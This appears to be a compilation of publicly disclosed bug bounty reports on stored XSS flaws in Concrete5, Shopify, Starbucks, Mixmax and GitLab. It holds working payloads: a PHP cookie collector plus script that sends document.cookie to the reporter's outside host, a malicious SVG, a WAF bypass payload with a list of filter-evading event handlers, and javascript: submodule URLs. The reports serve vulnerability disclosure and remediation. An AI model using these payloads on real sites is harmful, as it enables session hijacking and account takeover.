if (isset($_GET['c'])) {
	file_put_contents("cookies.txt", $_GET['c']);
}
```


- send message



To verify that vulnerability exists, log in as __admin__ (or any user you've sent message to) and go to Private Messages Inbox:

{F201512}

- open message

The content is properly sanitized (no JavaScript executed):


{F201514}



Now the fun part begins.

Select __Reply__ from the dropdown with message menu. As you can see, content of the original message is embeded below ```------- Original Message -------``` separator, however - is __not sanitized__, causes JavaScript script is executed __in context of logged admin__ (my sample attack scenario tries to steal cookie to hijack admin session and failed due to ```Http Only``` flag set, but it does not change the fact that Stored XSS attack works):

{F201513}

When we inspect HTML source, we can verify that closing ```</textarea>``` tag from payload allows to "escape" from message textarea and append and run JavaScript:

```html
<div class="form-group">
				<label for="body" class="control-label">Message</label>				<textarea id="msgBody" name="msgBody" rows="8" class="span5 form-control">


-------------------- Original Message --------------------
From: kotek
Date Sent: Jul 9, 2017, 9:55 PM
Subject: Problem with page!!!

Hi, could you please take a look at this and reply? Thanks!

</textarea>
<script>
        var i = document.createElement('img')
        i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;
        document.body.append(i);
    </script></textarea>			</div>

			<div class="ccm-dashboard-form-actions-wrapper">
			    <div class="ccm-dashboard-form-actions">
```


In presented PoC, one cookie was sent and saved on my 000web application:

{F201515}


## Impact

Any user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as __External Attack Vector__ in Concrete5 program policy.


## Testing environment

System:

- Concrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July  8th, installed localy
- PHP ver. 5.6.30
- Apache HTTP Server 2.4.25 for macOS
- MySQL ver. 5.7.13 for macOS

This vulnerability was tested on macOS Sierra 10.12.5 with following browsers:

- Chrome 59.0.3071.115
- Chromium build 61.0.3131.0
- Opera 46.0.2597.32


## Wrap up

I hope my report will help keep Concrete5 safe in the future.

Best Regards,

Rafal 'bl4de' Janicki

---

### [XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174)

- **Report ID:** `232174`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @bored-engineer
- **Bounty:** 5000 usd
- **Disclosed:** 2017-06-27T23:49:28.072Z
- **CVE(s):** -

**Vulnerability Information:**

# Description
Shopify allows developers to create a special type of application called a "[Sales Channel](https://help.shopify.com/api/sdks/sales-channel-sdk)". Developers are allowed to upload a 16x16 SVG "Navigation Icon" for their app provided the SVG follows the [design guidelines](https://help.shopify.com/api/sdks/sales-channel-sdk/design-guidelines/checklist#navigation-icon) which limits the allowed elements and attributes. For some reason when the SVG contains an XML entity this whitelist is no longer enforced allowing the developer to include malicious attributes such as `onload`. By uploading a malicious SVG a developer can obtain XSS on both partners.shopify.com, as well as any the admin panel of any shop which has authorized the sales channel. 

# Proof of Concept
This is relatively easy to reproduce, first create a new application within the [Partners dashboard](https://partners.shopify.com) then navigate to "Extensions" -> "Sales channel" to convert the application. After saving those changes a new field within the "App info" section titled "Navigation icon". Upload the following SVG:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```
After saving changes the XSS payload will fire on [partners.shopify.com](https://partners.shopify.com). To fire the payload on `$shop$.myshopify.com/admin/` you'll need to authorize the application on your shop:
I've created an example malicious application associated with my partner account `shopify-whitehat-2+hackerone@bored.engineer` to help demonstrate the issue, you can authorize it by opening the following URL on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce
```
Immediately after authorizing the application (and all future admin panel loads) an alert should appear on the /admin window containing document.domain.

# Exploitability
This seems like a really odd issue, so it may good to see if there are other places this icon could surface (ex. the app store or internal admin panels) to full understand the impact. For the known exploitable use-case via OAuth authorization you do need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it will immediately fire without additional user-interaction. 

# Remediation
The application should not allow XML entities in uploaded SVGs (or at least fix the parsing so it handles them correctly).

---

### [Stored XSS in comments on https://www.starbucks.co.uk/blog/*](https://hackerone.com/reports/218226)

- **Report ID:** `218226`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Starbucks
- **Reporter:** @bayotop
- **Bounty:** - usd
- **Disclosed:** 2017-06-27T17:13:40.679Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

there are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.

When a comment is sent the following request is made:
```http
POST /blog/addcomment HTTP/1.1
Host: www.starbucks.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
Content-Length: 321
Cookie: [redacted]
Connection: close

Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com
```
The values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.

You seem to be using a WAF which will block request (500) containing `<script></script>` and various input matching `on*=`.  However, I managed to find a bypass:

```html
</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
```

This will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability

Note that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).

Here is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:

```
onsearch
onwebkitanimationiteration
onwebkitanimationstart
onanimationiteration
onwebkitanimationend
onanimationstart
ondataavailable
ontransitionend
onanimationend
onreceived
onpopstate
```

To fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.

Please let me know in case you need any more information from my side.

---

### [[compose.mixmax.com] Stored XSS on compose.mixmax.com in contact names.](https://hackerone.com/reports/235292)

- **Report ID:** `235292`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Mixmax
- **Reporter:** @sh3r1
- **Bounty:** - usd
- **Disclosed:** 2017-06-06T03:30:26.811Z
- **CVE(s):** -

**Summary (team):**

Thanks @sh3r1 !

---

### [Stored XSS on Files overview by abusing git submodule URL](https://hackerone.com/reports/218872)

- **Report ID:** `218872`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2017-05-09T16:00:07.317Z
- **CVE(s):** -

**Vulnerability Information:**

# Vulnerability description
There's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.

# Proof of concept
To reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:

```
git clone git@gitlab.com:user/project
git clone git@gitlab.com:user/project.wiki
```

Now `cd project.wiki`  and initialize the repository:

```
touch some-file
git add some-file
git commit -am "Added file to initialize wiki repository"
git push
```

Now repeat the same in the `project` directory add the `project.wiki` as a relative git submodule to `project`:

```
touch some-file
git add some-file
git commit -am "Added file to initialize project repository"
git push
git submodule add ../project.wiki wiki
git add wiki
git commit -am "Added relative wiki module"
git push
```

This will create a `.gitmodules` file with the following contents:

```
[submodule "wiki"]
  path = wiki
  url = ../project.wiki
```

In this file, the URL can be updated to a `javascript:` URL. It won't error because the contents of the submodule are already fetched by the `git submodule add` command. Lets change `url = ../project.wiki` to `url = javascript:alert('XSS');` (see F173589). Now commit the results and push the changes:

```
git add .
git commit -am "Updated relative URL"
git push
```

Now go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the `wiki` directory, and see the JavaScript getting executed:

{F173602}

# Impact
An attacker could offload the current user's API token and impersonate the user through the API.

---
